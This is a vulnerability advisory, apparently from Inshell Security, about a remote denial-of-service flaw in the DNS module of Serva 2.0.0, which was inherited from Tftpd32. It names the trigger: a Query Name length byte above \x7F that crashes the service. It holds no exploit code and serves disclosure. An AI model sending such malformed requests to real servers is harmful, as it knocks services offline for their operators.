1. ADVISORY INFORMATION
-----------------------
Product:        Serva
Vendor URL:     www.vercot.com
Type:           Uncaught Exception [CWE-248]
Date found:     2012-07-08
Date published: 2013-01-14
CVSSv2 Score:   5.0 (AV:N/AC:L/Au:N/C:N/I:N/A:P)
CVE:            -


2. CREDITS
----------
This vulnerability was discovered and researched by Julien Ahrens from
Inshell Security.


3. VERSIONS AFFECTED
--------------------
Serva 2.0.0, older versions may be affected too.


4. VULNERABILITY DESCRIPTION
----------------------------
Serva v2.0.0 suffers from a Remote Denial of Service Vulnerability in
the DNS module.

The Query Name consists of multiple byte fields which contain the length
of the subsequent part of the name query. The application does not
properly validate the first length-field, which could lead to a stack
corruption resulting in a remote denial of service condition.

An attacker needs to send a DNS request with a manipulated length-byte
with a size greater than "\x7F" in the Query Name field to crash the
application.

Since parts of the Tftpd32 v4.0 release are used in Serva, this bug was
ported from the Tftpd32 v4.0 release too
(http://www.securityfocus.com/archive/1/522877).
